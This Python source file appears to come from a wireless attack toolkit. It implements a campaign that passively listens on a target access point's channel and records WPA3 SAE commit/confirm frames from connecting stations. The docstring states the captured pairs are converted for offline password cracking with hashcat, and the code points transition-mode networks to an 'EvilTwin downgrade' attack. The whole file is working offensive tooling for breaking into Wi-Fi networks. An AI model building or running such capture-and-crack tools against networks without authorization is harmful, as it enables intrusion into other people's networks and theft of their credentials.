"""SAE campaign: passive capture of WPA3 Dragonfly commit/confirm pairs.

Pure WPA3 mandates PMF, so deauth-driven capture is impossible: this campaign
never transmits, it leases the target's channel and records Authentication
(algorithm 3) frames until commit+confirm complete per station. One pair is
enough for offline analysis; the pcap converts via ``hcxpcapngtool -o`` for
``hashcat -m 22000``.
"""
from __future__ import annotations

import asyncio
import logging
import time
from dataclasses import dataclass
from typing import Dict, List, Optional

from airscope.crack.sae import SEQ_COMMIT, SEQ_CONFIRM, parse_sae_auth

from . import treelog
from .campaign import Campaign

logger = logging.getLogger(__name__)

SAE_FAMILY_AKMS = frozenset({0x08, 0x09, 0x18, 0x19})   # SAE, FT-SAE, SAE-EXT-KEY, FT-SAE-EXT-KEY
PSK_FAMILY_AKMS = frozenset({0x02, 0x04, 0x06})         # PSK, FT-PSK, PSK-SHA256


@dataclass(slots=True)
class SaePair:
    """One station's completed SAE exchange: commit + confirm raw frames."""

    sta: str
    commit: bytes
    confirm: bytes
    ts: float


class SaeCampaign(Campaign):
    """Passively capture SAE commit/confirm pairs from a pure-WPA3 target."""

    button_id = "btn-sae"
    key = "sae"
    hotkey = ("g", "SAE")
    idle_label = "SAE"
    run_label = "Stop SAE"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap) -> bool:
        """Pure WPA3-SAE only: an SAE-family AKM confirmed and no PSK-family
        AKM (transition mode belongs to the EvilTwin downgrade instead)."""
        akms = set(getattr(ap, "akm_suites", None) or ())
        return bool(akms & SAE_FAMILY_AKMS) and not bool(akms & PSK_FAMILY_AKMS)

    @classmethod
    def ineligible_reason(cls, ap) -> Optional[str]:
        if ap.is_hidden:
            return "hidden SSID: SAE material needs a known ESSID"
        akms = set(getattr(ap, "akm_suites", None) or ())
        if not akms & SAE_FAMILY_AKMS:
            return "no SAE AKM confirmed yet"
        if akms & PSK_FAMILY_AKMS:
            return "transition mode: use the EvilTwin downgrade"
        return None

    def __init__(self, array, target, log=None, target_pairs: int = 1):
        super().__init__(ap=target, array=array)
        self.target = target
        self.log = log or (lambda _m: None)
        self.target_pairs = target_pairs
        self.pairs: List[SaePair] = []
        self._seen: Dict[str, dict] = {}

    def frames_for_pcap(self) -> List[tuple[bytes, float]]:
        """Every captured SAE frame as (raw MPDU, timestamp) for the pcap."""
        out: List[tuple[bytes, float]] = []
        for half in self._seen.values():
            for seq in ("commit", "confirm"):
                if half.get(seq) is not None:
                    raw, ts = half[seq]
                    out.append((raw, ts))
        return out

    def _on_rx(self, pkt) -> None:
        """Fold one parsed frame: keep SAE commit/confirm for our BSSID."""
        if getattr(pkt, "type", "") != "mgmt_11":
            return
        if pkt.bssid.lower() != self.target.bssid.lower():
            return
        sae = parse_sae_auth(pkt.raw)
        if sae is None or sae.status != 0:
            return
        sta = pkt.client_mac or (sae.source if sae.source != pkt.bssid else sae.dest)
        if not sta or sta == "ff:ff:ff:ff:ff:ff":
            return
        half = self._seen.setdefault(sta, {})
        if sae.seq == SEQ_COMMIT and "commit" not in half:
            half["commit"] = (sae.raw, time.time())
        elif sae.seq == SEQ_CONFIRM and "confirm" not in half:
            half["confirm"] = (sae.raw, time.time())
        else:
            return
        if "commit" in half and "confirm" in half and not half.get("paired"):
            half["paired"] = True
            commit_raw, _ = half["commit"]
            confirm_raw, ts = half["confirm"]
            self.pairs.append(SaePair(sta=sta, commit=commit_raw, confirm=confirm_raw, ts=ts))
            self.log(treelog.leaf(f"SAE pair from {sta} ({len(self.pairs)})"))

    async def _loop(self) -> None:
        self.log(treelog.leaf(f"listening for SAE on CH{self.target.channel} (passive; PMF-proof)"))
        async with self.array.lease(channel=self.target.channel, iface=self.iface) as iface:
            iface.register_rx_callback(self._on_rx)
            try:
                while not self.stopped and len(self.pairs) < self.target_pairs:
                    await asyncio.sleep(0.5)
            finally:
                iface.unregister_rx_callback(self._on_rx)
        self.log(treelog.leaf(f"done: {len(self.pairs)} SAE pair(s)"))
